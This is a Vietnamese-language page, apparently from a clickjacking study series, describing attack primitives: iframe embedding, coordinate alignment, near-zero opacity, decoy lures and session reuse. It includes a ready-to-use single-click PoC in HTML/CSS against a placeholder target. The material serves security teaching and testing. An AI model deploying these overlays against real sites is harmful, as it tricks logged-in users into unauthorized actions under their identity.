# Primitives tấn công: iframe, Layering, Opacity

## Mục tiêu

Chuẩn hóa các building blocks mức thấp thường được dùng trong PoC clickjacking và mô phỏng tấn công thực tế.

## Primitive 1: Nhúng khung

Endpoint mục tiêu được tải trong một iframe.

```html
<iframe id="target" src="https://target.example/sensitive-action"></iframe>
```

Nếu chính sách chặn nhúng đã bật, clickjacking thường không khả thi với endpoint đó.

## Primitive 2: Căn chỉnh tọa độ

Attacker căn điều khiển nhạy cảm bị ẩn trong iframe trùng với phần tử mồi đang hiển thị.

```css
#target {
  position: relative;
  width: 1200px;
  height: 900px;
  z-index: 2;
  opacity: 0.01;
}

#decoy {
  position: absolute;
  top: 320px;
  left: 180px;
  z-index: 1;
}
```

## Primitive 3: Độ trong suốt và che giấu

Attacker tinh chỉnh mức che giấu thị giác bằng:

1. Opacity rất thấp.
2. Cắt vùng hiển thị để lộ đúng khu vực cần thao tác.
3. Dịch chuyển tọa độ chính xác để map vùng nhấp mồi vào control ẩn.

## Primitive 4: Kích hoạt tương tác người dùng

Trang tấn công phải thúc đẩy nạn nhân thao tác tại tọa độ do attacker chọn.

Các dạng mồi phổ biến:

1. Nút phần thưởng hoặc hành động khẩn cấp.
2. Điều hướng giả hoặc tương tác kiểu trò chơi.
3. Luồng tiện ích trông có vẻ hợp lệ.

## Primitive 5: Tái sử dụng phiên

Trang mục tiêu ẩn được tải cùng trạng thái trình duyệt của nạn nhân (cookie/phiên). Hành động trái phép sẽ thực thi dưới danh tính nạn nhân nếu họ đã đăng nhập.

## Khung PoC nhấp đơn

```html
<style>
  #target {
    position: relative;
    width: 1000px;
    height: 700px;
    opacity: 0.01;
    z-index: 2;
  }
  #bait {
    position: absolute;
    top: 360px;
    left: 220px;
    z-index: 1;
  }
</style>

<div id="bait">Click to continue</div>
<iframe id="target" src="https://target.example/action"></iframe>
```

## Primitive nhấp nhiều bước

Với workflow cần nhiều tương tác, attacker phải căn nhiều prompt mồi theo các trạng thái UI tuần tự của mục tiêu.

Độ phức tạp tăng rõ do timing, khác biệt viewport và nội dung động dịch chuyển.

## Primitive cử chỉ (kéo-thả)

Trong một số bối cảnh UI/trình duyệt, attacker có thể dùng sự kiện kéo-thả để đưa dữ liệu do attacker kiểm soát vào field của mục tiêu, sau đó yêu cầu thêm một cú nhấp để gửi.

## Bề mặt không dùng iframe

Không phải mọi UI redressing đều cần iframe truyền thống. Một số biến thể mới nhắm vào UI do extension trình duyệt chèn vào trang thông qua chồng lớp DOM/CSS.

## Yếu tố ảnh hưởng độ ổn định

| Yếu tố | Tác động đến tỷ lệ thành công |
| --- | --- |
| Layout responsive của mục tiêu | Khó căn tọa độ ổn định |
| Khác biệt zoom / DPI | Có thể phá vỡ map theo pixel |
| Nội địa hóa (độ dài chữ khác nhau) | Dịch chuyển control mục tiêu |
| Banner/popup động | Làm lệch vùng nhấp |
| Biến thiên hành vi người dùng | Giảm tính tất định |

## Tệp liên quan

- [Nền tảng UI Redressing trên Trình duyệt](01-browser-ui-redressing-fundamentals.md)
- [Khai thác cơ bản](05-basic-exploitation.md)
- [Cheatsheet payload và snippet](12-payloads-cheatsheet.md)
